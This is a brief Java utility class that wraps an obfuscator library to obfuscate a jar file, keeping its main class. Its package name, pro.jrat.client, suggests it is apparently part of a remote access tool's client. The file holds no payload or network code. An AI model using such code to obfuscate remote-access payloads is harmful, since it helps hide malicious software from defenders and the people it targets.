package pro.jrat.client.utils;

import java.io.File;
import java.util.jar.JarFile;

import com.redpois0n.zkmlib.JarUtils;
import com.redpois0n.zkmlib.Obfuscator;

public class ZkmLibUtils {
	
	public static void obfuscate(File input, File output) throws Exception {
		Obfuscator obfuscator = new Obfuscator(input, output, JarUtils.getMainClass(new JarFile(input)));
		obfuscator.obfuscate();
	}

}
